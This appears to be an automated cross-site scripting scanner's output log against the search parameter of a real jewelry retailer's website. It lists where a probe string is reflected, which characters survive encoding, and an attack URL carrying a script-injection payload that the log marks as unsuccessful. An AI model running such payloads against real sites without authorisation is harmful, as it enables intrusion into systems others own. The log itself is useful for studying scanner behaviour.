@@ -1,0 +1,137 @@
+https://us.pandora.net/en/jewelry/pets
+
+GET Params:[1]
+['q']
+_______________________________________________________________________________________________________
+https://us.pandora.net/en/search?q=(uvw"xyz'yxz</zxy
+
+----------------------------------------------------------------------------------
+Attribute Context: [0]
+
+----------------------------------------------------------------------------------
+HTML Context: [0]
+
+----------------------------------------------------------------------------------
+Script Context: [1]
+<script data-tealium-data type="application/json">
+	{"user_device_type":"desktop","environment":"PRODUCTION","country":"US","currency":"USD","language":"en-US","market":"United States","http_code":"200","site_locale":"en_US","site_alias":"en_US","site_section_levels":["Search"],"site_section_levels_id":["Search"],"page_id":"en-US","page_item_per_page":"","page_name":"search results","page_type":"search","page_name_adobe":"Search Results Not Found","search_term":"(uvw\"xyz'yxz</zxy","search_results":"0","estore_event":["internal search","internal search zero results"]}
+</script>
+
+----------------------------------------------------------------------------------
+URI Context: [17]
+<link rel="alternate" hreflang="en-gb" href="https://uk.pandora.net/on/demandware.store/Sites-en-GB-Site/en_GB/Search-Show?q=(uvw&quot;xyz'yxz&lt;/zxy" />
+<link rel="alternate" hreflang="da-dk" href="https://dk.pandora.net/on/demandware.store/Sites-da-DK-Site/da_DK/Search-Show?q=(uvw&quot;xyz'yxz&lt;/zxy" />
+<link rel="alternate" hreflang="de-at" href="https://at.pandora.net/on/demandware.store/Sites-de-AT-Site/de_AT/Search-Show?q=(uvw&quot;xyz'yxz&lt;/zxy" />
+<link rel="alternate" hreflang="de-de" href="https://de.pandora.net/on/demandware.store/Sites-de-DE-Site/de_DE/Search-Show?q=(uvw&quot;xyz'yxz&lt;/zxy" />
+<link rel="alternate" hreflang="fr-fr" href="https://fr.pandora.net/on/demandware.store/Sites-fr-FR-Site/fr_FR/Search-Show?q=(uvw&quot;xyz'yxz&lt;/zxy" />
+<link rel="alternate" hreflang="it-it" href="https://it.pandora.net/on/demandware.store/Sites-it-IT-Site/it_IT/Search-Show?q=(uvw&quot;xyz'yxz&lt;/zxy" />
+<link rel="alternate" hreflang="nl-nl" href="https://nl.pandora.net/on/demandware.store/Sites-nl-NL-Site/nl_NL/Search-Show?q=(uvw&quot;xyz'yxz&lt;/zxy" />
+<link rel="alternate" hreflang="pl-pl" href="https://pl.pandora.net/on/demandware.store/Sites-pl-PL-Site/pl_PL/Search-Show?q=(uvw&quot;xyz'yxz&lt;/zxy" />
+<link rel="alternate" hreflang="sv-se" href="https://se.pandora.net/on/demandware.store/Sites-sv-SE-Site/sv_SE/Search-Show?q=(uvw&quot;xyz'yxz&lt;/zxy" />
+<link rel="alternate" hreflang="en-us" href="https://us.pandora.net/on/demandware.store/Sites-en-US-Site/en_US/Search-Show?q=(uvw&quot;xyz'yxz&lt;/zxy" />
+<link rel="alternate" hreflang="en-ca" href="https://ca.pandora.net/on/demandware.store/Sites-en-CA-Site/en_CA/Search-Show?q=(uvw&quot;xyz'yxz&lt;/zxy" />
+<link rel="alternate" hreflang="fr-ca" href="https://ca.pandora.net/on/demandware.store/Sites-fr-CA-Site/fr_CA/Search-Show?q=(uvw&quot;xyz'yxz&lt;/zxy" />
+<link rel="alternate" hreflang="en-hk" href="https://hk.pandora.net/on/demandware.store/Sites-en-HK-Site/en_HK/Search-Show?q=(uvw&quot;xyz'yxz&lt;/zxy" />
+<link rel="alternate" hreflang="zh-hk" href="https://hk.pandora.net/on/demandware.store/Sites-zh-HK-Site/zh_HK/Search-Show?q=(uvw&quot;xyz'yxz&lt;/zxy" />
+<link rel="alternate" hreflang="en-nz" href="https://nz.pandora.net/on/demandware.store/Sites-en-NZ-Site/en_NZ/Search-Show?q=(uvw&quot;xyz'yxz&lt;/zxy" />
+<link rel="alternate" hreflang="en-au" href="https://au.pandora.net/on/demandware.store/Sites-en-AU-Site/en_AU/Search-Show?q=(uvw&quot;xyz'yxz&lt;/zxy" />
+<link rel="alternate" hreflang="zn-cn" href="https://cn.pandora.net/on/demandware.store/Sites-zn-CN-Site/zn_CN/Search-Show?q=(uvw&quot;xyz'yxz&lt;/zxy" />
+
+----------------------------------------------------------------------------------
+
+
+ENCODING     Presence	"	'	<	( 
+SCRIPT:		True	True	True	False	False
+
+Attack Payloads for SCRIPT
+['</script><script>alert(1)</script>']
+
+SCRIPT Attack Url: https://us.pandora.net/en/search?q=</script><script>alert(1)</script>
+
+ ______ UnSuccessful with payload: </script><script>alert(1)</script>
+
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
